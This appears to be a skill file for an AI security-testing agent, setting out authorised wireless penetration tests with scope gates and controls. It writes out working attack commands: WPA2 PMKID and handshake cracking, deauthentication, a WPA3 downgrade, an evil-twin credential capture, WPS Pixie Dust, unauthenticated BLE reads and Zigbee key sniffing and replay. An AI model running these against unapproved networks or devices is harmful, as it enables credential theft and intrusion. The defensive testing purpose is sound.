---
name: harness-wireless
description: "Test WiFi (WPA2/3, WPA-Enterprise, WPS), BLE, Zigbee, and wireless protocol security with bounded captures and controlled deauth."
---

# Wireless — WiFi, BLE, Zigbee, protocol analysis

Source: `testing-wifi`, `ble-security`, `zigbee-security` (2024: PMKID capture without deauth, WPA3-SAE dragonblood, BLE MITM via btlejuice, Zigbee key sniffing).

## Gate

Approved `SSID/BSSID/device` only. Every command via `cyber_process` `argv`. Bounded capture window (max 10 minutes). Deauth only on approved test network with no other users. Never jam, never disrupt production wireless. → `harness-vuln-triage` before `cyber_finding`.

## Steps

### 1. Wireless reconnaissance

```
cyber_process argv=["sudo","airmon-ng","start","wlan0"]
```

```
cyber_process argv=["sudo","airodump-ng","wlan0mon","--bssid","<TARGET_BSSID>","-c","<CHANNEL>","--output-format","csv","-w","recon"]
```

Record: SSID, BSSID, channel, encryption (WPA2/WPA3/WEP/Open), cipher (CCMP/TKIP), auth (PSK/Enterprise), connected clients. Hash the CSV output. Stop capture after 60 seconds.

### 2. Positive control — legitimate association

Connect the test device to the approved network with valid credentials:

```
cyber_process argv=["wpa_supplicant","-i","wlan0","-c","<wpa_supplicant.conf>","-B"]
cyber_process argv=["dhclient","wlan0"]
```

Confirm IP assignment and connectivity. This is the functional baseline.

### 3. WPA2-PSK — PMKID capture (no deauth)

```
cyber_process argv=["sudo","hcxdumptool","-i","wlan0mon","--filterlist_ap=<bssid-file>","--filtermode=2","--enable_status=1","-o","capture.pcapng"]
```

Extract hash:

```
cyber_process argv=["hcxpcapngtool","capture.pcapng","-o","hash.22000"]
```

Crack with bounded wordlist:

```
cyber_process argv=["hashcat","-m","22000","hash.22000","<wordlist>","--force"]
```

If cracked → weak PSK candidate. Record the hash, wordlist used, and time to crack.

### 4. WPA2-PSK — 4-way handshake (approved deauth only)

```
cyber_process argv=["sudo","airodump-ng","wlan0mon","--bssid","<TARGET_BSSID>","-c","<CHANNEL>","-w","handshake"]
```

Approved deauth (test network only, max 3 frames):

```
cyber_process argv=["sudo","aireplay-ng","-0","3","-a","<TARGET_BSSID>","-c","<CLIENT_MAC>","wlan0mon"]
```

Verify capture:

```
cyber_process argv=["aircrack-ng","-w","<wordlist>","handshake-01.cap"]
```

### 5. WPA3-SAE — downgrade and timing

Check for SAE transition mode (WPA3+WPA2 mixed):

```
cyber_process argv=["sudo","airodump-ng","wlan0mon","--bssid","<TARGET_BSSID>","-c","<CHANNEL>","--output-format","csv","-w","wpa3check"]
```

If the AP advertises both WPA2 and WPA3 RSN IEs → SAE transition mode. Force WPA2 association:

```
cyber_process argv=["wpa_supplicant","-i","wlan0","-c","<wpa2-only-conf>","-B"]
```

If WPA2 association succeeds on a WPA3 network → downgrade candidate.

Dragonblood timing:

```
cyber_process argv=["dragonslayer","-i","wlan0","-t","<TARGET_BSSID>","-a","timing"]
```

Five timing samples. If group negotiation timing leaks password-dependent information → Dragonblood candidate.

### 6. WPA-Enterprise — evil twin

Identify EAP type from probe responses. Set up rogue AP:

```
cyber_process argv=["eaphammer","--bssid","<TARGET_BSSID>","--essid","<TARGET_SSID>","--channel","<CH>","--auth","wpa-enterprise","--creds"]
```

If a test client connects and sends MS-CHAPv2 credentials → capture and crack:

```
cyber_process argv=["asleap","-C","<challenge>","-R","<response>","-W","<wordlist>"]
```

Test certificate validation: does the client accept any certificate without user warning?

### 7. WPS — Pixie Dust and online brute-force

```
cyber_process argv=["wash","-i","wlan0mon"]
```

If WPS enabled:

```
cyber_process argv=["reaver","-i","wlan0mon","-b","<TARGET_BSSID>","-vv","-K"]
```

Pixie Dust offline attack. If PIN recovered → WPS Pixie Dust candidate. If locked after attempts → record lockout threshold.

### 8. BLE — unauthenticated read

```
cyber_process argv=["sudo","hcitool","lescan"]
```

Enumerate services on approved device:

```
cyber_process argv=["gatttool","-b","<DEVICE_MAC>","--primary"]
cyber_process argv=["gatttool","-b","<DEVICE_MAC>","--characteristics"]
```

Read a characteristic without pairing:

```
cyber_process argv=["gatttool","-b","<DEVICE_MAC>","--char-read","-a","0x0025"]
```

If sensitive data returned without pairing or authentication → unauthenticated BLE read candidate. Test Just Works pairing:

```
cyber_process argv=["bluetoothctl","pair","<DEVICE_MAC>"]
```

If pairing succeeds with no PIN/confirmation → Just Works (no MITM protection) candidate.

### 9. Zigbee — key sniffing and replay

```
cyber_process argv=["zbdump","-f","15","-c","zigbee_capture.pcap","-w"]
```

Check for default trust center key:

```
cyber_process argv=["zbgoodfind","-f","zigbee_capture.pcap"]
```

If `ZigBeeAlliance09` decrypts traffic → default key candidate. Test replay:

```
cyber_process argv=["zbreplay","-f","zigbee_capture.pcap","-c","15"]
```

If replayed frame triggers device action → replay attack candidate.

### 10. Negative controls

| Control | Probe | Expected |
|---|---|---|
| Valid credentials | legitimate association | IP assigned, connectivity |
| Wrong PSK | connection attempt with bad password | rejected |
| WPA3 MFP deauth | deauth frame against WPA3 with PMF | no effect |
| BLE pairing rejection | connect to device requiring LESC OOB | pairing denied |
| Zigbee encrypted | capture on network with custom key | unreadable |

### Stop

Production networks, sustained jamming, more than 3 deauth frames, capture beyond 10 minutes, non-approved devices.

### Evidence ids

Keep recon-csv, positive-association, PMKID-hash, handshake-cap, crack-result, SAE-timing-samples (5), evil-twin-creds, WPS-pin, BLE-characteristic-reads, Zigbee-capture, and all controls as separate observations. Pcap files are evidence artifacts.

## Verification scenarios

| Scenario | Observation | Expected classification |
|---|---|---|
| PMKID hash cracked in < 1h with common wordlist | hashcat output + PSK | weak PSK candidate |
| PMKID hash not cracked after full wordlist | no match | inconclusive (not a finding) |
| Handshake captured, PSK cracked | aircrack output | weak PSK candidate |
| SAE transition mode, WPA2 association succeeds | WPA2 connected | WPA3 downgrade candidate |
| Dragonblood timing delta > threshold, 5 samples | consistent timing leak | Dragonblood candidate |
| Evil twin captures MS-CHAPv2 and cracks | asleap output + password | WPA-Enterprise credential capture |
| Client rejects rogue cert | connection refused | negative control confirmed |
| WPS Pixie Dust recovers PIN | reaver output + PIN | WPS Pixie Dust candidate |
| BLE read returns sensitive data without pairing | characteristic value | unauthenticated BLE read candidate |
| Zigbee default key decrypts traffic | zbgoodfind output | default key candidate |
| Zigbee replayed frame triggers action | device behavior change | Zigbee replay candidate |

A captured handshake is a lead. The finding is the **cracked key** or **accepted credential** or **unauthenticated access**.

## Done

`cyber_finding` cites the target, the protocol weakness, the captured evidence (hash/creds/characteristic), and all controls. Pcap files stored as artifacts. Uncracked hashes stay `not-tested`. Untested protocols stay `not-tested`.
